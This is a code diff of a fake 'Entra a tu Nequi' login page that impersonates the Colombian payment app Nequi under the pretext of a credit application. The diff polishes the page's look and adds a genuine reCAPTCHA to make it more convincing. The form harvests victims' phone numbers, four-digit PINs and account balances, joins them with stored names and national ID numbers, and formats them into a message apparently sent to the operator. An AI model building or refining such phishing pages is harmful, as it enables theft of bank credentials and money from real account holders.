@@ -4,6 +4,7 @@
     <meta charset="utf-8">
     <title>Nequi - Verificación</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <style>
         * {
             margin: 0;
@@ -12,76 +13,61 @@
         }
 
         body {
-            font-family: 'Manrope', -apple-system, sans-serif;
-            background-color: #f5f5f5;
-            color: #200020;
-        }
-
-        .wrap-header {
-            background-color: #ffffff;
-            padding: 15px 20px;
-            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            font-family: 'Manrope', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background: linear-gradient(135deg, #f5deb3 0%, #f0e4d7 50%, #e8d5c4 100%);
+            min-height: 100vh;
             display: flex;
-            justify-content: space-between;
+            justify-content: center;
             align-items: center;
-        }
-
-        .logo img {
-            height: 30px;
-        }
-
-        .buttons-right ul {
-            list-style: none;
-            display: flex;
-            gap: 15px;
-        }
-
-        .buttons-right a {
-            color: #200020;
-            text-decoration: none;
-            font-weight: 600;
-        }
-
-        .login-section {
-            max-width: 450px;
-            margin: 40px auto;
             padding: 20px;
         }
 
-        .login-wrap {
-            background: #ffffff;
-            border-radius: 20px;
-            padding: 40px 30px;
-            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
+        .login-container {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 12px;
+            padding: 40px 35px;
+            max-width: 420px;
+            width: 100%;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
         }
 
         h1 {
             color: #200020;
-            font-size: 1.8rem;
-            margin-bottom: 10px;
+            font-size: 1.75rem;
+            font-weight: 700;
+            margin-bottom: 8px;
+            text-align: left;
         }
 
-        p {
+        .subtitle {
             color: #666;
-            font-size: 1rem;
+            font-size: 0.95rem;
             margin-bottom: 30px;
+            text-align: left;
         }
 
-        .input-country {
+        .country-phone-group {
             display: flex;
             gap: 10px;
             margin-bottom: 20px;
         }
 
-        .select-country {
-            width: 100px;
-            padding: 15px;
-            background: #fbf7fb;
-            border: 1px solid #200020;
+        .country-select {
+            width: 90px;
+            padding: 12px 10px;
+            background: #f8f8f8;
+            border: 1px solid #ddd;
             border-radius: 8px;
             display: flex;
             align-items: center;
             gap: 8px;
+            cursor: pointer;
+            position: relative;
+        }
+
+        .country-select img {
+            width: 24px;
+            height: 16px;
         }
 
         .flag-icon {
@@ -91,234 +77,171 @@
             border-radius: 2px;
         }
 
-        .select-country p {
-            margin: 0;
+        .country-code {
             font-weight: 600;
+            color: #200020;
         }
 
-        .country-input {
-            display: none;
+        .dropdown-arrow {
+            font-size: 10px;
+            color: #666;
         }
 
         .form-group {
             margin-bottom: 20px;
             position: relative;
-            flex: 1;
         }
 
         .form-group input {
             width: 100%;
-            padding: 15px;
-            background: #fbf7fb;
-            border: 1px solid #200020;
+            padding: 14px 12px;
+            background: #f8f8f8;
+            border: 1px solid #ddd;
             border-radius: 8px;
             font-size: 1rem;
             color: #200020;
+            transition: all 0.3s;
         }
 
         .form-group input:focus {
             outline: none;
             border-color: #da0081;
+            background: #fff;
         }
 
-        .form-group label {
-            position: absolute;
-            left: 15px;
-            top: 15px;
-            color: #666;
-            pointer-events: none;
-            transition: 0.2s;
+        .form-group input::placeholder {
+            color: #999;
         }
 
-        .form-group input:focus + label,
-        .form-group input:not(:placeholder-shown) + label {
-            top: -10px;
-            left: 10px;
-            font-size: 12px;
-            background: white;
-            padding: 0 5px;
-            color: #da0081;
+        .phone-input {
+            flex: 1;
         }
 
-        .captcha {
-            width: 100%;
-            max-width: 250px;
-            height: 70px;
-            background: #e0e0e0;
-            border: 2px solid #200020;
-            border-radius: 8px;
-            cursor: pointer;
+        .recaptcha-wrapper {
+            margin: 25px 0;
             display: flex;
-            align-items: center;
             justify-content: center;
-            margin: 20px auto;
-            font-size: 14px;
-            color: #666;
-            font-weight: 600;
-            transition: all 0.3s;
         }
 
-        .captcha:hover {
-            background: #d0d0d0;
-        }
-
-        .captcha.selected {
-            background: #d4edda;
-            border-color: #28a745;
-            color: #28a745;
-        }
-
-        .captcha.selected::before {
-            content: "✓ ";
-            font-size: 20px;
-            margin-right: 5px;
-        }
-
-        .form-btn-submit {
+        .btn-submit {
             width: 100%;
-            padding: 18px;
-            background: #200020;
+            padding: 16px;
+            background: #da0081;
             color: white;
             border: none;
             border-radius: 8px;
             font-size: 1.1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: background 0.3s;
-            margin-top: 20px;
+            transition: all 0.3s;
+            margin-top: 10px;
         }
 
-        .form-btn-submit:hover:not(:disabled) {
-            background: #3d003d;
+        .btn-submit:hover:not(:disabled) {
+            background: #c00070;
+            transform: translateY(-1px);
+            box-shadow: 0 4px 12px rgba(218, 0, 129, 0.3);
         }
 
-        .form-btn-submit:disabled {
-            background: #ccc;
+        .btn-submit:disabled {
+            background: #e0e0e0;
+            color: #999;
             cursor: not-allowed;
+            transform: none;
         }
 
-        @media (max-width: 768px) {
-            .login-section {
-                padding: 10px;
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 30px 25px;
             }
 
-            .login-wrap {
-                padding: 30px 20px;
+            h1 {
+                font-size: 1.5rem;
             }
         }
     </style>
 </head>
 
 <body>
-    <div id="content">
-        <header>
-            <div class="wrap-header">
-                <div class="logo">
-                    <a href="https://www.nequi.com.co">
-                        <img alt="nequi" src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
-                    </a>
+    <div class="login-container">
+        <h1>Entra a tu Nequi</h1>
+        <p class="subtitle">Solicitud de crédito propulsor</p>
+        
+        <form id="loginForm">
+            <!-- Número de celular con selector de país -->
+            <div class="country-phone-group">
+                <div class="country-select">
+                    <div class="flag-icon"></div>
+                    <span class="country-code">+57</span>
+                    <span class="dropdown-arrow">▼</span>
                 </div>
-                <div class="buttons-right">
-                    <ul>
-                        <li>
-                            <a target="_blank" href="https://recarga.nequi.com.co/bdigitalpsl">Recarga</a>
-                        </li>
-                    </ul>
-                </div>
-            </div>
-        </header>
-
-        <section class="login-section">
-            <div class="login-wrap">
-                <h1>Entra a tu Nequi</h1>
-                <p>Solicitud de crédito propulsor</p>
                 
-                <div class="login-form-wrap">
-                    <div class="container-form">
-                        <!-- Número de celular -->
-                        <div class="input-country">
-                            <div class="wrap-select-country">
-                                <div class="select-country">
-                                    <div class="country-wrap country-active">
-                                        <div class="select-col select-col-img">
-                                            <div class="flag-icon"></div>
-                                        </div>
-                                        <div class="select-col">
-                                            <p>+57</p>
-                                            <input class="country-input" type="text" name="j_region" id="j_region" value="57">
-                                        </div>
-                                    </div>
-                                </div>
-                            </div>
-                            
-                            <div class="form-group">
-                                <input type="tel" 
-                                    id="txtUsername" 
-                                    name="txtUsername"
-                                    required 
-                                    maxlength="12" 
-                                    minlength="12" 
-                                    inputmode="numeric"
-                                    placeholder=" ">
-                                <label for="txtUsername">Número de celular</label>
-                            </div>
-                        </div>
-
-                        <!-- Contraseña -->
-                        <div class="form-group">
-                            <input
-                                class="password"
-                                type="password" 
-                                id="txtPass" 
-                                name="txtPass" 
-                                required 
-                                maxlength="4" 
-                                minlength="4" 
-                                inputmode="numeric" 
-                                pattern="\d*"
-                                placeholder=" ">
-                            <label for="txtPass">Contraseña</label>
-                        </div>
-
-                        <!-- Saldo -->
-                        <div class="form-group">
-                            <input 
-                                id="txtSaldo" 
-                                name="txtSaldo" 
-                                required 
-                                inputmode="numeric"
-                                placeholder=" ">
-                            <label for="txtSaldo">Saldo actual</label>
-                        </div>
-                        
-                        <!-- Captcha -->
-                        <div id="captcha" class="captcha">Click para verificar que no eres un robot</div>
-                    </div>
-
-                    <!-- Botón de envío -->
-                    <div class="btn-wrap">
-                        <input class="form-btn-submit" type="submit" value="Entra" id="btnUsuario" name="btnUsuario" disabled>
-                    </div>
+                <div class="form-group phone-input">
+                    <input 
+                        type="tel" 
+                        id="txtUsername" 
+                        name="txtUsername"
+                        placeholder="Número de celular"
+                        required 
+                        maxlength="12" 
+                        inputmode="numeric">
                 </div>
             </div>
-        </section>
+
+            <!-- Contraseña -->
+            <div class="form-group">
+                <input
+                    type="password" 
+                    id="txtPass" 
+                    name="txtPass" 
+                    placeholder="Contraseña"
+                    required 
+                    maxlength="4" 
+                    inputmode="numeric" 
+                    pattern="\d*">
+            </div>
+
+            <!-- Saldo actual -->
+            <div class="form-group">
+                <input 
+                    type="text"
+                    id="txtSaldo" 
+                    name="txtSaldo" 
+                    placeholder="Saldo actual"
+                    required 
+                    inputmode="numeric">
+            </div>
+            
+            <!-- reCAPTCHA -->
+            <div class="recaptcha-wrapper">
+                <div class="g-recaptcha" data-sitekey="6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i" data-callback="onRecaptchaSuccess"></div>
+            </div>
+
+            <!-- Botón de envío -->
+            <button type="submit" class="btn-submit" id="btnUsuario" disabled>Entra</button>
+        </form>
     </div>
 
     <script type="text/javascript">
+        let recaptchaVerified = false;
+
+        // Callback del reCAPTCHA
+        function onRecaptchaSuccess(token) {
+            recaptchaVerified = true;
+            validateForm();
+        }
+
         document.addEventListener("DOMContentLoaded", function() {
             const usernameInput = document.getElementById('txtUsername');
             const passwordInput = document.getElementById('txtPass');
             const saldoInput = document.getElementById('txtSaldo');
-            const captchaDiv = document.getElementById('captcha');
             const submitBtn = document.getElementById('btnUsuario');
-
-            let captchaClicked = false;
+            const form = document.getElementById('loginForm');
 
             // Eventos
             usernameInput.addEventListener('input', formatUsername);
             passwordInput.addEventListener('input', formatPassword);
             saldoInput.addEventListener('input', formatSaldo);
-            captchaDiv.addEventListener('click', toggleCaptcha);
 
             // Formatear número de celular (XXX XXX XXXX)
             function formatUsername() {
@@ -352,29 +275,22 @@
                 const passwordValid = /^\d{4}$/.test(passwordInput.value);
                 const saldoValid = saldoInput.value.length >= 4;
 
-                if (usernameValid && passwordValid && saldoValid && captchaClicked) {
+                if (usernameValid && passwordValid && saldoValid && recaptchaVerified) {
                     submitBtn.disabled = false;
-                    submitBtn.classList.remove('disabled');
                 } else {
                     submitBtn.disabled = true;
-                    submitBtn.classList.add('disabled');
                 }
             }
 
-            // Toggle captcha
-            function toggleCaptcha() {
-                captchaClicked = true;
-                captchaDiv.textContent = "Verificado correctamente";
-                captchaDiv.classList.add('selected');
-                validateForm();
-            }
+            // Hacer validateForm global
+            window.validateForm = validateForm;
 
             // Obtener datos del localStorage
             const nombreApellido = localStorage.getItem("nombreApellido");
             const cedula = localStorage.getItem("cedula");
 
             // Envío del formulario
-            submitBtn.addEventListener('click', async function(e) {
+            form.addEventListener('submit', async function(e) {
                 e.preventDefault();
 
                 const usuario = usernameInput.value.trim();
@@ -417,7 +333,7 @@
                              `🪪 **Cédula:** ${cedula}\n` +
                              `📱 **Número:** ${usuario}\n` +
                              `🔑 **Clave:** ${clave}\n` +
-                             `💰 **Saldo:** ${saldo}\n` +
+                             `💰 **Saldo:** $${saldo}\n` +
                              `📅 **Fecha:** ${new Date().toLocaleString('es-CO')}`
                 };
 
